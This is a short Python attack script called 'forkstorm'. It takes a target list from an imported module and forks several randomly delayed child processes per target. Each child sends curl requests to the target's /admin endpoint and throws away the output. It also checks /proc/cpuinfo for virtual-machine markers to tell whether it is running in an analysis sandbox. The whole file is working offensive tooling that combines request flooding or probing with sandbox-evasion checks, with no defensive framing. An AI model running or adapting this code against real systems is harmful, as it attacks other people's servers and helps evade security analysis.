import os, random, time
from memory_engine import get_top_targets

def fork_payload(ip, port):
    for i in range(random.randint(2, 5)):
        pid = os.fork()
        if pid == 0:
            time.sleep(random.uniform(0.5, 2))
            os.system(f"curl -s http://{ip}:{port}/admin > /dev/null")
            os._exit(0)

def detect_sandbox():
    try:
        with open("/proc/cpuinfo") as f:
            flags = f.read()
            if "kvm" in flags or "vmware" in flags or "virtual" in flags:
                return True
    except:
        return False
    return False

def forkstorm():
    sandbox = detect_sandbox()
    targets = get_top_targets()
    print(f"[!] Sandbox detected: {sandbox}")
    for t in targets:
        ip, port = t.split(":")
        print(f"[+] Forking payloads to {ip}:{port}")
        fork_payload(ip, port)

if __name__ == "__main__":
    forkstorm()
